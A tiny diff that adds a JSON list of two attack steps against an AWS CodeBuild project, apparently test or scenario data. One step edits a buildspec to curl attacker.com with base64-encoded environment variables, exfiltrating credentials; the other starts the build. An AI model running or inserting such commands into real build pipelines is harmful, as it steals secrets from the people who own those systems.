@@ -1,0 +1,4 @@
+[
+  "Modify buildspec to add: curl http://attacker.com/exfil?creds=$(env | base64)",
+  "aws codebuild start-build --project-name TargetProject"
+]
